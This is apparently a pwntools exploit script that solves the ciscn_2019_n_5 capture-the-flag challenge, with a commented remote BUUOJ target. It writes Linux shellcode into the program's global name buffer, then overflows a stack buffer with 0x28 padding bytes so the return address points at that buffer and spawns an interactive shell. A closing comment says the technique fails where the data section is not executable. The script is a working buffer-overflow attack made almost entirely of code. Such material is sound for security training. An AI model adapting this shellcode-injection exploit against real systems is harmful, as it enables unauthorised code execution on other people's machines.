from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

exe = ELF("./ciscn_2019_n_5")
r = exe.process()
# r = remote("node4.buuoj.cn", 25345)

r.recvuntil(b"name\n")
r.send(asm(shellcraft.sh()))
r.recvuntil(b"?\n")
r.sendline(cyclic(0x28) + p64(exe.sym["name"]))
r.interactive()
# This challenge can't success on ubuntu 22.04, the data section is not executable